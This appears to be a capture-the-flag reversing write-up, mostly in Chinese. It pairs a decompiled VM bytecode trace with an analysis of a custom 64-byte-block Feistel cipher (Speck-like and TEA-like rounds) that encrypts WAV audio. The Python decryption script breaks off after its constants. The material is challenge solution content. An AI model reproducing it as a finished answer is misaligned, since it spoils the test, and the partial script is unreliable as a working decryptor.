[5945] MEM32[(r15 + 224)] = (((MEM32[(r15 + 100)] << 4) ^ (MEM32[(r15 + 100)] >> 5)) + MEM32[(r15 + 72)])
[5965] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 180)]) ^ MEM32[(r15 + 224)])
[5982] MEM32[(r15 + 228)] = ((MEM32[(r15 + 80)] << 8) | (MEM32[(r15 + 80)] >> 24))
[5997] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 0))
[6012] MEM32[(r15 + 212)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[6025] MEM32[(r15 + 136)] = (MEM32[(r15 + 40)] ^ MEM32[(r15 + 184)])
[6038] MEM32[(r15 + 140)] = (MEM32[(r15 + 44)] ^ MEM32[(r15 + 188)])
[6051] MEM32[(r15 + 144)] = (MEM32[(r15 + 48)] ^ MEM32[(r15 + 192)])
[6064] MEM32[(r15 + 148)] = (MEM32[(r15 + 52)] ^ MEM32[(r15 + 196)])
[6077] MEM32[(r15 + 152)] = (MEM32[(r15 + 56)] ^ MEM32[(r15 + 200)])
[6090] MEM32[(r15 + 156)] = (MEM32[(r15 + 60)] ^ MEM32[(r15 + 204)])
[6103] MEM32[(r15 + 160)] = (MEM32[(r15 + 64)] ^ MEM32[(r15 + 208)])
[6116] MEM32[(r15 + 164)] = (MEM32[(r15 + 68)] ^ MEM32[(r15 + 212)])
[6124] MEM32[(r15 + 40)] = MEM32[(r15 + 72)]
[6132] MEM32[(r15 + 72)] = MEM32[(r15 + 136)]
[6140] MEM32[(r15 + 44)] = MEM32[(r15 + 76)]
[6148] MEM32[(r15 + 76)] = MEM32[(r15 + 140)]
[6156] MEM32[(r15 + 48)] = MEM32[(r15 + 80)]
[6164] MEM32[(r15 + 80)] = MEM32[(r15 + 144)]
[6172] MEM32[(r15 + 52)] = MEM32[(r15 + 84)]
[6180] MEM32[(r15 + 84)] = MEM32[(r15 + 148)]
[6188] MEM32[(r15 + 56)] = MEM32[(r15 + 88)]
[6196] MEM32[(r15 + 88)] = MEM32[(r15 + 152)]
[6204] MEM32[(r15 + 60)] = MEM32[(r15 + 92)]
[6212] MEM32[(r15 + 92)] = MEM32[(r15 + 156)]
[6220] MEM32[(r15 + 64)] = MEM32[(r15 + 96)]
[6228] MEM32[(r15 + 96)] = MEM32[(r15 + 160)]
[6236] MEM32[(r15 + 68)] = MEM32[(r15 + 100)]
[6244] MEM32[(r15 + 100)] = MEM32[(r15 + 164)]
[6256] MEM32[(r15 + 216)] = (MEM32[(r15 + 216)] + 0x70336367)
[6268] MEM32[(r15 + 220)] = (MEM32[(r15 + 220)] + 0x70336364)
[6297] MEM32[(r15 + 104)] = ((((MEM32[(r15 + 108)] ^ MEM32[(r15 + 216)]) << 3) | ((MEM32[(r15 + 108)] ^ MEM32[(r15 + 216)]) >> 29)) + MEM32[(r15 + 104)])
[6326] MEM32[(r15 + 108)] = ((((MEM32[(r15 + 112)] ^ MEM32[(r15 + 104)]) << 5) | ((MEM32[(r15 + 112)] ^ MEM32[(r15 + 104)]) >> 27)) + MEM32[(r15 + 108)])
[6355] MEM32[(r15 + 112)] = ((((MEM32[(r15 + 116)] ^ MEM32[(r15 + 108)]) << 7) | ((MEM32[(r15 + 116)] ^ MEM32[(r15 + 108)]) >> 25)) + MEM32[(r15 + 112)])
[6384] MEM32[(r15 + 116)] = ((((MEM32[(r15 + 120)] ^ MEM32[(r15 + 112)]) << 11) | ((MEM32[(r15 + 120)] ^ MEM32[(r15 + 112)]) >> 21)) + MEM32[(r15 + 116)])
[6413] MEM32[(r15 + 120)] = ((((MEM32[(r15 + 124)] ^ MEM32[(r15 + 116)]) << 13) | ((MEM32[(r15 + 124)] ^ MEM32[(r15 + 116)]) >> 19)) + MEM32[(r15 + 120)])
[6442] MEM32[(r15 + 124)] = ((((MEM32[(r15 + 128)] ^ MEM32[(r15 + 120)]) << 17) | ((MEM32[(r15 + 128)] ^ MEM32[(r15 + 120)]) >> 15)) + MEM32[(r15 + 124)])
[6471] MEM32[(r15 + 128)] = ((((MEM32[(r15 + 132)] ^ MEM32[(r15 + 124)]) << 19) | ((MEM32[(r15 + 132)] ^ MEM32[(r15 + 124)]) >> 13)) + MEM32[(r15 + 128)])
[6500] MEM32[(r15 + 132)] = ((((MEM32[(r15 + 104)] ^ MEM32[(r15 + 128)]) << 23) | ((MEM32[(r15 + 104)] ^ MEM32[(r15 + 128)]) >> 9)) + MEM32[(r15 + 132)])
[6518] MEM32[(r15 + 136)] = ((MEM32[(r15 + 104)] ^ MEM32[(r15 + 112)]) ^ MEM32[(r15 + 216)])
[6540] MEM32[(r15 + 140)] = ((MEM32[(r15 + 108)] ^ MEM32[(r15 + 116)]) ^ (MEM32[(r15 + 216)] + 0x62616f7a))
[6562] MEM32[(r15 + 144)] = ((MEM32[(r15 + 120)] ^ MEM32[(r15 + 128)]) ^ (MEM32[(r15 + 216)] + 0x6f6e6777))
[6584] MEM32[(r15 + 148)] = ((MEM32[(r15 + 124)] ^ MEM32[(r15 + 132)]) ^ (MEM32[(r15 + 216)] + 0x696e6221))
[6599] MEM32[(r15 + 152)] = (MEM32[(r15 + 104)] + MEM32[(r15 + 120)])
[6614] MEM32[(r15 + 156)] = (MEM32[(r15 + 108)] + MEM32[(r15 + 124)])
[6629] MEM32[(r15 + 160)] = (MEM32[(r15 + 112)] + MEM32[(r15 + 128)])
[6644] MEM32[(r15 + 164)] = (MEM32[(r15 + 116)] + MEM32[(r15 + 132)])
[6657] MEM32[(r15 + 168)] = (MEM32[(r15 + 104)] ^ MEM32[(r15 + 124)])
[6670] MEM32[(r15 + 172)] = (MEM32[(r15 + 108)] ^ MEM32[(r15 + 128)])
[6683] MEM32[(r15 + 176)] = (MEM32[(r15 + 112)] ^ MEM32[(r15 + 132)])
[6696] MEM32[(r15 + 180)] = (MEM32[(r15 + 116)] ^ MEM32[(r15 + 120)])
[6713] MEM32[(r15 + 224)] = ((MEM32[(r15 + 72)] >> 8) | (MEM32[(r15 + 72)] << 24))
[6728] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 76)])
[6741] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] ^ MEM32[(r15 + 136)])
[6758] MEM32[(r15 + 228)] = ((MEM32[(r15 + 76)] << 3) | (MEM32[(r15 + 76)] >> 29))
[6771] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ MEM32[(r15 + 224)])
[6779] MEM32[(r15 + 72)] = MEM32[(r15 + 224)]
[6787] MEM32[(r15 + 76)] = MEM32[(r15 + 228)]
[6804] MEM32[(r15 + 224)] = ((MEM32[(r15 + 80)] >> 8) | (MEM32[(r15 + 80)] << 24))
[6819] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 84)])
[6832] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] ^ MEM32[(r15 + 140)])
[6849] MEM32[(r15 + 228)] = ((MEM32[(r15 + 84)] << 3) | (MEM32[(r15 + 84)] >> 29))
[6862] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ MEM32[(r15 + 224)])
[6870] MEM32[(r15 + 80)] = MEM32[(r15 + 224)]
[6878] MEM32[(r15 + 84)] = MEM32[(r15 + 228)]
[6895] MEM32[(r15 + 224)] = ((MEM32[(r15 + 88)] >> 8) | (MEM32[(r15 + 88)] << 24))
[6910] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 92)])
[6923] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] ^ MEM32[(r15 + 144)])
[6940] MEM32[(r15 + 228)] = ((MEM32[(r15 + 92)] << 3) | (MEM32[(r15 + 92)] >> 29))
[6953] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ MEM32[(r15 + 224)])
[6961] MEM32[(r15 + 88)] = MEM32[(r15 + 224)]
[6969] MEM32[(r15 + 92)] = MEM32[(r15 + 228)]
[6986] MEM32[(r15 + 224)] = ((MEM32[(r15 + 96)] >> 8) | (MEM32[(r15 + 96)] << 24))
[7001] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 100)])
[7014] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] ^ MEM32[(r15 + 148)])
[7031] MEM32[(r15 + 228)] = ((MEM32[(r15 + 100)] << 3) | (MEM32[(r15 + 100)] >> 29))
[7044] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ MEM32[(r15 + 224)])
[7052] MEM32[(r15 + 96)] = MEM32[(r15 + 224)]
[7060] MEM32[(r15 + 100)] = MEM32[(r15 + 228)]
[7084] MEM32[(r15 + 224)] = (((MEM32[(r15 + 72)] << 4) ^ (MEM32[(r15 + 72)] >> 5)) + MEM32[(r15 + 76)])
[7104] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 152)]) ^ MEM32[(r15 + 224)])
[7121] MEM32[(r15 + 228)] = ((MEM32[(r15 + 84)] << 1) | (MEM32[(r15 + 84)] >> 31))
[7136] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 1))
[7151] MEM32[(r15 + 184)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[7175] MEM32[(r15 + 224)] = (((MEM32[(r15 + 76)] << 4) ^ (MEM32[(r15 + 76)] >> 5)) + MEM32[(r15 + 80)])
[7195] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 156)]) ^ MEM32[(r15 + 224)])
[7212] MEM32[(r15 + 228)] = ((MEM32[(r15 + 88)] << 2) | (MEM32[(r15 + 88)] >> 30))
[7227] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 2))
[7242] MEM32[(r15 + 188)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[7266] MEM32[(r15 + 224)] = (((MEM32[(r15 + 80)] << 4) ^ (MEM32[(r15 + 80)] >> 5)) + MEM32[(r15 + 84)])
[7286] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 160)]) ^ MEM32[(r15 + 224)])
[7303] MEM32[(r15 + 228)] = ((MEM32[(r15 + 92)] << 3) | (MEM32[(r15 + 92)] >> 29))
[7318] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 3))
[7333] MEM32[(r15 + 192)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[7357] MEM32[(r15 + 224)] = (((MEM32[(r15 + 84)] << 4) ^ (MEM32[(r15 + 84)] >> 5)) + MEM32[(r15 + 88)])
[7377] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 164)]) ^ MEM32[(r15 + 224)])
[7394] MEM32[(r15 + 228)] = ((MEM32[(r15 + 96)] << 4) | (MEM32[(r15 + 96)] >> 28))
[7409] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 4))
[7424] MEM32[(r15 + 196)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[7448] MEM32[(r15 + 224)] = (((MEM32[(r15 + 88)] << 4) ^ (MEM32[(r15 + 88)] >> 5)) + MEM32[(r15 + 92)])
[7468] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 168)]) ^ MEM32[(r15 + 224)])
[7485] MEM32[(r15 + 228)] = ((MEM32[(r15 + 100)] << 5) | (MEM32[(r15 + 100)] >> 27))
[7500] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 5))
[7515] MEM32[(r15 + 200)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[7539] MEM32[(r15 + 224)] = (((MEM32[(r15 + 92)] << 4) ^ (MEM32[(r15 + 92)] >> 5)) + MEM32[(r15 + 96)])
[7559] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 172)]) ^ MEM32[(r15 + 224)])
[7576] MEM32[(r15 + 228)] = ((MEM32[(r15 + 72)] << 6) | (MEM32[(r15 + 72)] >> 26))
[7591] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 6))
[7606] MEM32[(r15 + 204)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[7630] MEM32[(r15 + 224)] = (((MEM32[(r15 + 96)] << 4) ^ (MEM32[(r15 + 96)] >> 5)) + MEM32[(r15 + 100)])
[7650] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 176)]) ^ MEM32[(r15 + 224)])
[7667] MEM32[(r15 + 228)] = ((MEM32[(r15 + 76)] << 7) | (MEM32[(r15 + 76)] >> 25))
[7682] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 7))
[7697] MEM32[(r15 + 208)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[7721] MEM32[(r15 + 224)] = (((MEM32[(r15 + 100)] << 4) ^ (MEM32[(r15 + 100)] >> 5)) + MEM32[(r15 + 72)])
[7741] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 180)]) ^ MEM32[(r15 + 224)])
[7758] MEM32[(r15 + 228)] = ((MEM32[(r15 + 80)] << 8) | (MEM32[(r15 + 80)] >> 24))
[7773] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 0))
[7788] MEM32[(r15 + 212)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[7801] MEM32[(r15 + 136)] = (MEM32[(r15 + 40)] ^ MEM32[(r15 + 184)])
[7814] MEM32[(r15 + 140)] = (MEM32[(r15 + 44)] ^ MEM32[(r15 + 188)])
[7827] MEM32[(r15 + 144)] = (MEM32[(r15 + 48)] ^ MEM32[(r15 + 192)])
[7840] MEM32[(r15 + 148)] = (MEM32[(r15 + 52)] ^ MEM32[(r15 + 196)])
[7853] MEM32[(r15 + 152)] = (MEM32[(r15 + 56)] ^ MEM32[(r15 + 200)])
[7866] MEM32[(r15 + 156)] = (MEM32[(r15 + 60)] ^ MEM32[(r15 + 204)])
[7879] MEM32[(r15 + 160)] = (MEM32[(r15 + 64)] ^ MEM32[(r15 + 208)])
[7892] MEM32[(r15 + 164)] = (MEM32[(r15 + 68)] ^ MEM32[(r15 + 212)])
[7900] MEM32[(r15 + 40)] = MEM32[(r15 + 72)]
[7908] MEM32[(r15 + 72)] = MEM32[(r15 + 136)]
[7916] MEM32[(r15 + 44)] = MEM32[(r15 + 76)]
[7924] MEM32[(r15 + 76)] = MEM32[(r15 + 140)]
[7932] MEM32[(r15 + 48)] = MEM32[(r15 + 80)]
[7940] MEM32[(r15 + 80)] = MEM32[(r15 + 144)]
[7948] MEM32[(r15 + 52)] = MEM32[(r15 + 84)]
[7956] MEM32[(r15 + 84)] = MEM32[(r15 + 148)]
[7964] MEM32[(r15 + 56)] = MEM32[(r15 + 88)]
[7972] MEM32[(r15 + 88)] = MEM32[(r15 + 152)]
[7980] MEM32[(r15 + 60)] = MEM32[(r15 + 92)]
[7988] MEM32[(r15 + 92)] = MEM32[(r15 + 156)]
[7996] MEM32[(r15 + 64)] = MEM32[(r15 + 96)]
[8004] MEM32[(r15 + 96)] = MEM32[(r15 + 160)]
[8012] MEM32[(r15 + 68)] = MEM32[(r15 + 100)]
[8020] MEM32[(r15 + 100)] = MEM32[(r15 + 164)]
[8025] r0 = MEM32[(r15 + 40)]
[8031] r1 = ((r0 >> 24) & 255)
[8037] r2 = ((r0 >> 8) & 0xff00)
[8043] r3 = ((r0 << 8) & 0xff0000)
[8049] r4 = ((r0 << 24) & 0xff000000)
[8059] r6 = (((r1 | r2) | r3) | r4)
[8064] MEM32[(r11 + r10)] = r6
[8069] r0 = MEM32[(r15 + 44)]
[8075] r1 = ((r0 >> 24) & 255)
[8081] r2 = ((r0 >> 8) & 0xff00)
[8087] r3 = ((r0 << 8) & 0xff0000)
[8093] r4 = ((r0 << 24) & 0xff000000)
[8103] r6 = (((r1 | r2) | r3) | r4)
[8110] MEM32[((r11 + r10) + 4)] = r6
[8115] r0 = MEM32[(r15 + 48)]
[8121] r1 = ((r0 >> 24) & 255)
[8127] r2 = ((r0 >> 8) & 0xff00)
[8133] r3 = ((r0 << 8) & 0xff0000)
[8139] r4 = ((r0 << 24) & 0xff000000)
[8149] r6 = (((r1 | r2) | r3) | r4)
[8156] MEM32[((r11 + r10) + 8)] = r6
[8161] r0 = MEM32[(r15 + 52)]
[8167] r1 = ((r0 >> 24) & 255)
[8173] r2 = ((r0 >> 8) & 0xff00)
[8179] r3 = ((r0 << 8) & 0xff0000)
[8185] r4 = ((r0 << 24) & 0xff000000)
[8195] r6 = (((r1 | r2) | r3) | r4)
[8202] MEM32[((r11 + r10) + 12)] = r6
[8207] r0 = MEM32[(r15 + 56)]
[8213] r1 = ((r0 >> 24) & 255)
[8219] r2 = ((r0 >> 8) & 0xff00)
[8225] r3 = ((r0 << 8) & 0xff0000)
[8231] r4 = ((r0 << 24) & 0xff000000)
[8241] r6 = (((r1 | r2) | r3) | r4)
[8248] MEM32[((r11 + r10) + 16)] = r6
[8253] r0 = MEM32[(r15 + 60)]
[8259] r1 = ((r0 >> 24) & 255)
[8265] r2 = ((r0 >> 8) & 0xff00)
[8271] r3 = ((r0 << 8) & 0xff0000)
[8277] r4 = ((r0 << 24) & 0xff000000)
[8287] r6 = (((r1 | r2) | r3) | r4)
[8294] MEM32[((r11 + r10) + 20)] = r6
[8299] r0 = MEM32[(r15 + 64)]
[8305] r1 = ((r0 >> 24) & 255)
[8311] r2 = ((r0 >> 8) & 0xff00)
[8317] r3 = ((r0 << 8) & 0xff0000)
[8323] r4 = ((r0 << 24) & 0xff000000)
[8333] r6 = (((r1 | r2) | r3) | r4)
[8340] MEM32[((r11 + r10) + 24)] = r6
[8345] r0 = MEM32[(r15 + 68)]
[8351] r1 = ((r0 >> 24) & 255)
[8357] r2 = ((r0 >> 8) & 0xff00)
[8363] r3 = ((r0 << 8) & 0xff0000)
[8369] r4 = ((r0 << 24) & 0xff000000)
[8379] r6 = (((r1 | r2) | r3) | r4)
[8386] MEM32[((r11 + r10) + 28)] = r6
[8391] r0 = MEM32[(r15 + 72)]
[8397] r1 = ((r0 >> 24) & 255)
[8403] r2 = ((r0 >> 8) & 0xff00)
[8409] r3 = ((r0 << 8) & 0xff0000)
[8415] r4 = ((r0 << 24) & 0xff000000)
[8425] r6 = (((r1 | r2) | r3) | r4)
[8432] MEM32[((r11 + r10) + 32)] = r6
[8437] r0 = MEM32[(r15 + 76)]
[8443] r1 = ((r0 >> 24) & 255)
[8449] r2 = ((r0 >> 8) & 0xff00)
[8455] r3 = ((r0 << 8) & 0xff0000)
[8461] r4 = ((r0 << 24) & 0xff000000)
[8471] r6 = (((r1 | r2) | r3) | r4)
[8478] MEM32[((r11 + r10) + 36)] = r6
[8483] r0 = MEM32[(r15 + 80)]
[8489] r1 = ((r0 >> 24) & 255)
[8495] r2 = ((r0 >> 8) & 0xff00)
[8501] r3 = ((r0 << 8) & 0xff0000)
[8507] r4 = ((r0 << 24) & 0xff000000)
[8517] r6 = (((r1 | r2) | r3) | r4)
[8524] MEM32[((r11 + r10) + 40)] = r6
[8529] r0 = MEM32[(r15 + 84)]
[8535] r1 = ((r0 >> 24) & 255)
[8541] r2 = ((r0 >> 8) & 0xff00)
[8547] r3 = ((r0 << 8) & 0xff0000)
[8553] r4 = ((r0 << 24) & 0xff000000)
[8563] r6 = (((r1 | r2) | r3) | r4)
[8570] MEM32[((r11 + r10) + 44)] = r6
[8575] r0 = MEM32[(r15 + 88)]
[8581] r1 = ((r0 >> 24) & 255)
[8587] r2 = ((r0 >> 8) & 0xff00)
[8593] r3 = ((r0 << 8) & 0xff0000)
[8599] r4 = ((r0 << 24) & 0xff000000)
[8609] r6 = (((r1 | r2) | r3) | r4)
[8616] MEM32[((r11 + r10) + 48)] = r6
[8621] r0 = MEM32[(r15 + 92)]
[8627] r1 = ((r0 >> 24) & 255)
[8633] r2 = ((r0 >> 8) & 0xff00)
[8639] r3 = ((r0 << 8) & 0xff0000)
[8645] r4 = ((r0 << 24) & 0xff000000)
[8655] r6 = (((r1 | r2) | r3) | r4)
[8662] MEM32[((r11 + r10) + 52)] = r6
[8667] r0 = MEM32[(r15 + 96)]
[8673] r1 = ((r0 >> 24) & 255)
[8679] r2 = ((r0 >> 8) & 0xff00)
[8685] r3 = ((r0 << 8) & 0xff0000)
[8691] r4 = ((r0 << 24) & 0xff000000)
[8701] r6 = (((r1 | r2) | r3) | r4)
[8708] MEM32[((r11 + r10) + 56)] = r6
[8713] r0 = MEM32[(r15 + 100)]
[8719] r1 = ((r0 >> 24) & 255)
[8725] r2 = ((r0 >> 8) & 0xff00)
[8731] r3 = ((r0 << 8) & 0xff0000)
[8737] r4 = ((r0 << 24) & 0xff000000)
[8747] r6 = (((r1 | r2) | r3) | r4)
[8754] MEM32[((r11 + r10) + 60)] = r6
[8759] r0 = MEM32[(r11 + r10)]
[8766] r1 = MEM32[((r11 + r10) + 32)]
[8770] r0 = (r0 ^ r1)
[8776] r1 = ((r0 >> 24) & 255)
[8782] r2 = ((r0 >> 8) & 0xff00)
[8788] r3 = ((r0 << 8) & 0xff0000)
[8794] r4 = ((r0 << 24) & 0xff000000)
[8807] MEM32[(r15 + 8)] = (((r1 | r2) | r3) | r4)
[8814] r0 = MEM32[((r11 + r10) + 4)]
[8821] r1 = MEM32[((r11 + r10) + 36)]
[8825] r0 = (r0 ^ r1)
[8831] r1 = ((r0 >> 24) & 255)
[8837] r2 = ((r0 >> 8) & 0xff00)
[8843] r3 = ((r0 << 8) & 0xff0000)
[8849] r4 = ((r0 << 24) & 0xff000000)
[8862] MEM32[(r15 + 12)] = (((r1 | r2) | r3) | r4)
[8869] r0 = MEM32[((r11 + r10) + 8)]
[8876] r1 = MEM32[((r11 + r10) + 40)]
[8880] r0 = (r0 ^ r1)
[8886] r1 = ((r0 >> 24) & 255)
[8892] r2 = ((r0 >> 8) & 0xff00)
[8898] r3 = ((r0 << 8) & 0xff0000)
[8904] r4 = ((r0 << 24) & 0xff000000)
[8917] MEM32[(r15 + 16)] = (((r1 | r2) | r3) | r4)
[8924] r0 = MEM32[((r11 + r10) + 12)]
[8931] r1 = MEM32[((r11 + r10) + 44)]
[8935] r0 = (r0 ^ r1)
[8941] r1 = ((r0 >> 24) & 255)
[8947] r2 = ((r0 >> 8) & 0xff00)
[8953] r3 = ((r0 << 8) & 0xff0000)
[8959] r4 = ((r0 << 24) & 0xff000000)
[8972] MEM32[(r15 + 20)] = (((r1 | r2) | r3) | r4)
[8979] r0 = MEM32[((r11 + r10) + 16)]
[8986] r1 = MEM32[((r11 + r10) + 48)]
[8990] r0 = (r0 ^ r1)
[8996] r1 = ((r0 >> 24) & 255)
[9002] r2 = ((r0 >> 8) & 0xff00)
[9008] r3 = ((r0 << 8) & 0xff0000)
[9014] r4 = ((r0 << 24) & 0xff000000)
[9027] MEM32[(r15 + 24)] = (((r1 | r2) | r3) | r4)
[9034] r0 = MEM32[((r11 + r10) + 20)]
[9041] r1 = MEM32[((r11 + r10) + 52)]
[9045] r0 = (r0 ^ r1)
[9051] r1 = ((r0 >> 24) & 255)
[9057] r2 = ((r0 >> 8) & 0xff00)
[9063] r3 = ((r0 << 8) & 0xff0000)
[9069] r4 = ((r0 << 24) & 0xff000000)
[9082] MEM32[(r15 + 28)] = (((r1 | r2) | r3) | r4)
[9089] r0 = MEM32[((r11 + r10) + 24)]
[9096] r1 = MEM32[((r11 + r10) + 56)]
[9100] r0 = (r0 ^ r1)
[9106] r1 = ((r0 >> 24) & 255)
[9112] r2 = ((r0 >> 8) & 0xff00)
[9118] r3 = ((r0 << 8) & 0xff0000)
[9124] r4 = ((r0 << 24) & 0xff000000)
[9137] MEM32[(r15 + 32)] = (((r1 | r2) | r3) | r4)
[9144] r0 = MEM32[((r11 + r10) + 28)]
[9151] r1 = MEM32[((r11 + r10) + 60)]
[9155] r0 = (r0 ^ r1)
[9161] r1 = ((r0 >> 24) & 255)
[9167] r2 = ((r0 >> 8) & 0xff00)
[9173] r3 = ((r0 << 8) & 0xff0000)
[9179] r4 = ((r0 << 24) & 0xff000000)
[9192] MEM32[(r15 + 36)] = (((r1 | r2) | r3) | r4)
[9196] r10 = (r10 + 64)
[9197] JMP -> 137
HALT
```

vm算法分析：

```Python
块大小：64 字节（16 × 32位字）
密钥：初始密钥 [0x00010203, ..., 0x1c1d1e1f]
结构：4 轮 Feistel 结构
每轮操作：
密钥调度（key_schedule）
子密钥派生（derive_subkeys）
Speck-like 加密（speck_like_encrypt）
TEA-like 混合（tea_like_mix）
Feistel 交换
```

 VM内存布局

```YAML
def setup_memory(self, input_data, buf1_base, buf2_base, state_base):
    # r13 = input size
    self.regs[13] = len(input_data)
    # r14 = input pointer
    self.regs[14] = INPUT_BASE
    # r12 = buf1 (临时缓冲区)
    self.regs[12] = BUF1_BASE
    # r11 = buf2 (输出缓冲区)
    self.regs[11] = BUF2_BASE
    # r15 = state buffer (工作区)
    self.regs[15] = STATE_BASE
State buffer的偏移分配（从vm_decompiled.txt分析得出）：
40-68   : L (8 words, 左半部分)
72-100  : R (8 words, 右半部分)
104-132 : K (8 words, 密钥状态)
136-148 : rk (4 words, Round keys)
152-164 : sk (4 words, Sum keys)
168-180 : xk (4 words, XOR keys)
184-212 : mix (8 words, TEA-like混合结果)
216     : sum0
220     : sum1
224,228 : 临时寄存器
```

密钥调度算法

从反编译代码第928行开始的密钥更新：

```Python
def key_schedule(K, sum0):
    """更新8字密钥状态"""
    K[0] = rotl32(K[1] ^ sum0, 3) + K[0]
    K[1] = rotl32(K[2] ^ K[0], 5) + K[1]
    K[2] = rotl32(K[3] ^ K[1], 7) + K[2]
    K[3] = rotl32(K[4] ^ K[2], 11) + K[3]
    K[4] = rotl32(K[5] ^ K[3], 13) + K[4]
    K[5] = rotl32(K[6] ^ K[4], 17) + K[5]
    K[6] = rotl32(K[7] ^ K[5], 19) + K[6]
    K[7] = rotl32(K[0] ^ K[6], 23) + K[7]
    return K
```

子密钥派生

```Python
def derive_subkeys(K, sum0):
    # Round keys (rk0..rk3) -- 用于Speck-like步骤
    rk0 = (K[0] ^ K[2]) ^ sum0
    rk1 = (K[1] ^ K[3]) ^ (sum0 + 0x62616f7a)  # "baoz"
    rk2 = (K[4] ^ K[6]) ^ (sum0 + 0x6f6e6777)  # "ongw"
    rk3 = (K[5] ^ K[7]) ^ (sum0 + 0x696e6221)  # "inb!"

    # Sum keys (sk0..sk3) -- 用于TEA-like步骤
    sk0 = K[0] + K[4]
    sk1 = K[1] + K[5]
    sk2 = K[2] + K[6]
    sk3 = K[3] + K[7]

    # XOR keys (xk0..xk3) -- 用于TEA-like步骤
    xk0 = K[0] ^ K[5]
    xk1 = K[1] ^ K[6]
    xk2 = K[2] ^ K[7]
    xk3 = K[3] ^ K[4]

    return (rk0, rk1, rk2, rk3), (sk0, sk1, sk2, sk3), (xk0, xk1, xk2, xk3)
```

Speck-like加密

```Python
def speck_like_encrypt(L, R, rk):
    """Speck-like轮函数"""
    L = rotr32(L, 8) + R
    L = L ^ rk
    R = rotl32(R, 3) ^ L
    return L, R
```

TEA-like混合

```Python
def tea_like_mix(data, sum1, sk, xk):
    """TEA/XTEA-like混合步骤"""
    d = list(data)
    out = [0] * 8
    
    # 输出模式：d[3],d[4],d[5],d[6],d[7],d[0],d[1],d[2]
    second_idx = [3, 4, 5, 6, 7, 0, 1, 2]
    rot_amounts = [1, 2, 3, 4, 5, 6, 7, 8]
    shr_amounts = [1, 2, 3, 4, 5, 6, 7, 0]
    
    keys_8 = [sk[0], sk[1], sk[2], sk[3], xk[0], xk[1], xk[2], xk[3]]
    
    for i in range(8):
        a = d[i]
        b = d[(i + 1) % 8]
        c = d[second_idx[i]]
        k = keys_8[i]
        
        # 关键：这里是逻辑左移，不是循环左移！
        part1 = u32(u32(u32(a << 4) ^ (a >> 5)) + b)
        part1 = u32(u32(sum1 + k) ^ part1)
        part2 = u32(rotl32(c, rot_amounts[i]) ^ (sum1 >> shr_amounts[i]))
        out[i] = u32(part1 + part2)
    
    return out
```

- 加密入口是 `vmEncryptorBridge.vmEncrypt()`
- 被加密的数据是 `currentPayload`
- `currentPayload` 来自前端 `parseSuMv()` 的返回值
- `parseSuMv` 解码 SUMV 格式得到 WAV 音频数据

解密脚本

```Python
#!/usr/bin/env python3
"""
VM Cipher implementation based on decompiled bytecode.
This is a custom block cipher operating on 64-byte blocks (16 x uint32 big-endian).
"""

import struct
import ctypes as ct

def u32(x):
    return x & 0xFFFFFFFF

def rotl32(x, n):
    return u32((x << n) | (x >> (32 - n)))

def rotr32(x, n):
    return u32((x >> n) | (x << (32 - n)))

def bswap32(x):
    """Byte-swap a 32-bit integer (little-endian <-> big-endian)"""
    return (((x >> 24) & 0xFF) |
            ((x >> 8) & 0xFF00) |
            ((x << 8) & 0xFF0000) |
            ((x << 24) & 0xFF000000))

# Constants from VM bytecode
CONST_INIT = 0x73756572       # "suer" BE
DELTA      = 0x70336364       # "p3cd" BE  -- used every round for sum1/sum0
DELTA_INC  = [0x70336364, 0x70336365, 0x70336366, 0x70336367]  # round-specific increments for sum0
CONST_K1   = 0x62616f7a       # "baoz" BE
CONST_K2   = 0x6f6e6777       # "ongw" BE  
CONST_K3   = 0x696e6221       # "inb!" BE

# Key schedule rotation amounts
KEY_ROTS = [3, 5, 7, 11, 13, 17, 19, 23]

